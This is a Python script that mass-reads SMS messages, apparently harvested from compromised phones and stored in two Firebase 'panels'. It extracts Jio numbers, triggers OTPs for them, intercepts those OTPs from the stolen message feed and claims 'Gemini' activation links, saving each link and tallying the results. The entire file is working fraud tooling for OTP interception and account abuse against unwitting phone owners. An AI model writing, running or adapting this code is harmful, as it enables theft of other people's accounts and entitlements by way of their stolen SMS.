#!/usr/bin/env python3
"""Fresh Jio Gemini run: scan ALL devices (messages node) on the 2 new panels,
extract Jio numbers not in used list, run OTP -> activation flow."""
import sys, asyncio, aiohttp, json, time
sys.path.insert(0, "/root/jio_farm")
import myjio

PANELS = [
    "https://jackie-7a125-default-rtdb.firebaseio.com",
    "https://vicky-singh-20bdd-default-rtdb.firebaseio.com",
]
MAX_NUMBERS = 80  # cap per run

async def get_json(s, url, params=None):
    try:
        async with s.get(url, params=params or {}) as r:
            if r.status != 200:
                return None
            txt = await r.text()
            if not txt or txt == "null":
                return None
            return json.loads(txt)
    except Exception:
        return None

async def scan_device(s, base, dev, sem, out):
    async with sem:
        data = await get_json(s, f"{base}/messages/{dev}.json",
                              {"orderBy": '"$key"', "limitToLast": "30"})
        if not isinstance(data, dict):
            return
        msgs = {k: v for k, v in data.items() if isinstance(v, dict)}
        if not msgs or not myjio.is_jio_sim_device(msgs):
            return
        for mobile in myjio.number_candidates(msgs):
            out.setdefault(mobile, []).append((base, dev))

async def main():
    t0 = time.time()
    found = {}  # mobile -> [(base, dev), ...]
    conn = aiohttp.TCPConnector(limit=60)
    timeout = aiohttp.ClientTimeout(total=30)
    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as s:
        for base in PANELS:
            shallow = await get_json(s, f"{base}/messages.json", {"shallow": "true"})
            devs = list(shallow.keys()) if isinstance(shallow, dict) else []
            print(f"{base} → {len(devs)} devices", flush=True)
            sem = asyncio.Semaphore(50)
            await asyncio.gather(*[scan_device(s, base, d, sem, found) for d in devs])
            print(f"  jio numbers so far: {len(found)} ({int(time.time()-t0)}s)", flush=True)

    used = myjio.load_used_numbers()
    fresh = [(m, v[0]) for m, v in found.items() if m not in used]
    print(f"\nTotal Jio numbers: {len(found)} | used: {len(found)-len(fresh)} | fresh: {len(fresh)}", flush=True)
    fresh.sort()
    targets = fresh[:MAX_NUMBERS]
    print(f"Processing {len(targets)} fresh numbers...\n", flush=True)

    panel_sessions = {b: myjio.firebase_session() for b in PANELS}
    statuses = {}
    valid_links = 0
    for serial, (mobile, (base, dev)) in enumerate(targets, start=1):
        print(f"\n[{serial}/{len(targets)}] {base.split('//')[1][:28]} dev={dev[:12]} ending {mobile[-4:]}", flush=True)
        firebase = panel_sessions[base]
        jio = myjio.jio_session()
        try:
            if not myjio.is_jio_number(jio, mobile):
                status, url = "not_jio_number", ""
            else:
                known = set()
                data = await await_get(base, dev)
                if isinstance(data, dict):
                    known = set(data.keys())
                if not myjio.send_otp(jio, mobile):
                    status, url = "otp_send_failed", ""
                elif not myjio.wait_for_otp(firebase, base, "", dev, known, jio, mobile):
                    status, url = "otp_failed", ""
                else:
                    status, url = myjio.get_activation(jio)
        except Exception as e:
            status, url = f"error:{e}", ""
        statuses[status] = statuses.get(status, 0) + 1
        myjio.save_used_number(mobile)
        if myjio.save_link(url):
            valid_links += 1
        myjio.save_result(serial, dev, mobile, status, url)
        print(f"Status: {status}", flush=True)
        if url:
            print(f"LINK → {url}", flush=True)

    print("\n==== SUMMARY ====", flush=True)
    for st, c in sorted(statuses.items()):
        print(f"{st:25}: {c}", flush=True)
    print(f"VALID new links: {valid_links}", flush=True)

async def await_get(base, dev):
    # sync helper for known_keys via requests
    import requests
    r = requests.get(f"{base}/messages/{dev}.json",
                     params={"orderBy": '"$key"', "limitToLast": "5"}, timeout=20)
    try:
        return r.json()
    except Exception:
        return None

if __name__ == "__main__":
    asyncio.run(main())
